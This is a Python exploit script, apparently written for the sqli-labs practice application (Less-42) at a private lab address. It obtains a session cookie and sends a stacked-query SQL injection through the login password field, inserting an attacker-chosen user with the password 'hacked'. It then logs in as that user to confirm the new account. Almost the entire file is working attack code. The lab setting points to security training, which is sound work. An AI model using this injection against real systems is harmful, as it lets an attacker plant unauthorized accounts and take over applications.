#!/usr/bin/env python

import random
import requests
import re
import sys

idx = random.randint(30,500)

banner = '''
USAGE: python %s <New Username>
EXAMPLE: python %s eviluser
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

url_1 = "http://172.16.214.227/sqli-labs/Less-42/index.php"
url_2 = "http://172.16.214.227/sqli-labs/Less-42/login.php"

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

sessid = requests.get(url_1, headers=header, verify=False, allow_redirects=False).cookies['PHPSESSID']
cookie = {'PHPSESSID': sessid}

query_1 = {
    "login_user": sys.argv[1],
    "login_password": "pass'; insert into users(id,username,password) values('%d','%s','hacked')-- " % (idx, sys.argv[1]),
    "mysubmit": "Login"
}

print("[*] Query: %s" % query_1)

res1 = requests.post(url_2, headers=header, data=query_1, cookies=cookie, verify=False)

query_2 = {
    "login_user": sys.argv[1],
    "login_password": "hacked",
    "mysubmit": "Login"
}

res2 = requests.post(url_2, headers=header, data=query_2, cookies=cookie, verify=False, allow_redirects=False)

if(res2.cookies['Auth']):
    print("[+] SUCCESS!!")
    print("[*] New User ID is %d." % idx)
    print("[*] (USER) %s (PASSWORD) hacked" % sys.argv[1])
else:
    print("[-] Failed.")
